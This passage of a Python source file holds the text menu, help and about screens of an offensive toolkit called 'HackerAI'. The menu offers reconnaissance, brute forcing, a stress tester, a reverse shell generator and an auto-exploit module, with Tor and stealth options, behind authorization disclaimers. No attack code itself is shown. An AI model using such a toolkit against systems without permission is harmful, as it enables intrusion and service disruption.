    
    def main_menu(self):
        """Main menu with all options"""
        while self.running:
            clean()
            self.display_banner()
            
            # Display status
            proxy_status = f"{G}ON{W}" if self.proxy_manager.use_proxy_rotation else f"{R}OFF{W}"
            tor_status = f"{G}ON{W}" if self.proxy_manager.use_tor else f"{R}OFF{W}"
            stealth_status = f"{G}ON{W}" if self.proxy_manager.stealth_mode else f"{R}OFF{W}"
            local_ip = get_local_ip()
            
            print(f" {C}╔═══════════════════════════════════════════════════╗{W}")
            print(f" {C}║ Status: Proxy:{proxy_status:4} | Tor:{tor_status:4} | Stealth:{stealth_status:4} ║{W}")
            print(f" {C}║ Threads: {THREADS:<3} | LHOST: {LHOST:<15}:{LPORT:<5} ║{W}")
            print(f" {C}║ Local IP: {local_ip or 'N/A':<37} ║{W}")
            print(f" {C}╚═══════════════════════════════════════════════════╝{W}")
            
            print(f"\n{Y}━━━━━━━━━━━━━━━[ SCANNING TOOLS ]━━━━━━━━━━━━━━━{W}")
            print(f"  {G}[1]{W} Advanced Reconnaissance")
            print(f"  {G}[2]{W} Web Vulnerability Auditor")
            print(f"  {G}[3]{W} Directory Bruteforce")
            print(f"  {G}[4]{W} Subdomain Enumeration")
            print(f"  {G}[5]{W} Network Scanner")
            
            print(f"\n{Y}━━━━━━━━━━━━━━━[ ATTACK TOOLS ]━━━━━━━━━━━━━━━━{W}")
            print(f"  {R}[6]{W} Advanced Stress Tester (Async)")
            print(f"  {R}[7]{W} Reverse Shell Generator")
            print(f"  {R}[8]{W} Auto-Exploit Module")
            
            print(f"\n{Y}━━━━━━━━━━━━━━━[ UTILITIES ]━━━━━━━━━━━━━━━━━━━{W}")
            print(f"  {B}[S]{W} Settings & Configuration")
            print(f"  {B}[R]{W} View & Export Reports")
            print(f"  {B}[H]{W} Help")
            
            print(f"\n{Y}━━━━━━━━━━━━━━━[ SYSTEM ]━━━━━━━━━━━━━━━━━━━━━{W}")
            print(f"  {C}[A]{W} About HackerAI")
            print(f"  {C}[0]{W} Exit Tool")
            print(f"{Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
            
            choice = input(f"\n{C}HackerAI@{self.current_version} > {W}").strip().lower()
            
            if choice == '1':
                try:
                    from scanner import advanced_recon
                    advanced_recon()
                except ImportError as e:
                    print(f"{R}[!] Error loading scanner: {e}{W}")
                    input(f"{Y}Press Enter to continue...{W}")
            elif choice == '2':
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(self.web_auditor_advanced())
                except Exception as e:
                    print(f"{R}[!] Error in web auditor: {e}{W}")
                    input(f"{Y}Press Enter to continue...{W}")
            elif choice == '3':
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(self.fast_bruter_advanced())
                except Exception as e:
                    print(f"{R}[!] Error in brute forcer: {e}{W}")
                    input(f"{Y}Press Enter to continue...{W}")
            elif choice == '4':
                try:
                    from scanner import subdomain_enumeration
                    subdomain_enumeration()
                except ImportError as e:
                    print(f"{R}[!] Error loading subdomain module: {e}{W}")
                    input(f"{Y}Press Enter to continue...{W}")
            elif choice == '5':
                try:
                    from scanner import network_scanner
                    network_scanner()
                except ImportError as e:
                    print(f"{R}[!] Error loading network scanner: {e}{W}")
                    input(f"{Y}Press Enter to continue...{W}")
            elif choice == '6':
                self.stress_test_advanced_async()
            elif choice == '7':
                self.reverse_shell_generator_advanced()
            elif choice == '8':
                self.auto_exploit_interface()
            elif choice == 's':
                self.settings_menu()
            elif choice == 'r':
                self.view_report_enhanced()
            elif choice == 'h':
                self.show_help()
            elif choice == 'a':
                self.about_tool()
            elif choice == '0':
                print(f"\n{G}[*] Thank you for using HackerAI {self.current_version}!{W}")
                print(f"{C}[*] Stay ethical, stay secure.{W}")
                time.sleep(1)
                self.running = False
                sys.exit(0)
            else:
                print(f"{R}[!] Invalid choice. Please try again.{W}")
                time.sleep(1)
    
    async def web_auditor_advanced(self):
        """Wrapper for web auditor"""
        try:
            from scanner import web_auditor_advanced
            await web_auditor_advanced(self.proxy_manager)
        except ImportError as e:
            print(f"{R}[!] Error importing web auditor: {e}{W}")
            input(f"{Y}Press Enter to continue...{W}")
    
    async def fast_bruter_advanced(self):
        """Wrapper for brute forcer"""
        try:
            from scanner import fast_bruter_advanced
            await fast_bruter_advanced()
        except ImportError as e:
            print(f"{R}[!] Error importing brute forcer: {e}{W}")
            input(f"{Y}Press Enter to continue...{W}")
    
    def show_help(self):
        """Show help documentation"""
        clean()
        self.display_banner()
        
        print(f"\n{G}{'='*60}{W}")
        print(f"{C}           HELP & DOCUMENTATION{W}")
        print(f"{G}{'='*60}{W}")
        
        help_text = f"""
{Y}Quick Start Guide:{W}
{G}1.{W} Configure your settings (LHOST, LPORT, proxies)
{G}2.{W} Start with Advanced Reconnaissance to gather info
{G}3.{W} Use Web Vulnerability Auditor to find weaknesses
{G}4.{W} Use appropriate attack tools based on findings

{Y}Tool Descriptions:{W}
{G}• Advanced Reconnaissance:{W} Gather DNS, WHOIS, port info
{G}• Web Vulnerability Auditor:{W} Check for SQLi, XSS, LFI, etc.
{G}• Directory Bruteforce:{W} Find hidden directories/files
{G}• Subdomain Enumeration:{W} Discover subdomains
{G}• Network Scanner:{W} Scan network hosts and ports
{G}• Stress Tester:{W} Load testing (authorized use only)
{G}• Reverse Shell Generator:{W} Create shells for various platforms
{G}• Auto-Exploit Module:{W} Automate exploitation of known vulns

{Y}Important Notes:{W}
{R}•{W} Use this tool only on systems you own or have permission to test
{R}•{W} Keep your tools and dependencies updated
{R}•{W} Always backup important data before testing
{R}•{W} Check local laws and regulations before penetration testing

{Y}Keyboard Shortcuts:{W}
{G}Ctrl+C{W} - Cancel current operation
{G}Ctrl+Z{W} - Pause current scan (where supported)

{Y}Need More Help?{W}
{C}•{W} Check the README.txt file
{C}•{W} Review config.py for all settings
"""
        print(help_text)
        
        input(f"\n{Y}Press Enter to return to menu...{W}")
    
    def about_tool(self):
        """Show about information"""
        clean()
        self.display_banner()
        
        print(f"\n{G}{'='*60}{W}")
        print(f"{C}           ABOUT HACKERAI{W}")
        print(f"{G}{'='*60}{W}")
        
        about_text = f"""
{Y}HackerAI {self.current_version}{W}

{C}A comprehensive ethical hacking and security assessment tool{W}
{BL}────────────────────────────────────────────────────────────{W}

{Y}Features:{W}
{G}✓{W} Advanced reconnaissance and information gathering
{G}✓{W} Web vulnerability scanning and auditing
{G}✓{W} Automated exploitation of common vulnerabilities
{G}✓{W} Stress testing and load analysis
{G}✓{W} Reverse shell generation for multiple platforms
{G}✓{W} Proxy support and Tor integration
{G}✓{W} Async engine for high-performance operations

{Y}Architecture:{W}
{C}•{W} Modular design for easy extension
{C}•{W} Async/await for better performance
{C}•{W} Color-coded output for better readability
{C}•{W} JSON-based reporting system
{C}•{W} Configurable via config.py

{Y}License:{W}
{R}This tool is for educational and authorized testing purposes only.{W}
{C}Always obtain proper authorization before testing any system.{W}

{Y}Credits:{W}
{C}•{W} Developed by HackerAI Team
{C}•{W} Special thanks to the open-source security community
{C}•{W} Built with Python 3.8+

{Y}Disclaimer:{W}
{R}The developers assume no liability and are not responsible{W}
{R}for any misuse or damage caused by this program.{W}
"""
        print(about_text)
        
        input(f"\n{Y}Press Enter to return to menu...{W}")

# Run the menu system
if __name__ == "__main__":
    try:
        menu = MenuSystem()
        menu.main_menu()
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Tool interrupted by user.{W}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{W}")
        import traceback
        traceback.print_exc()
        sys.exit(1)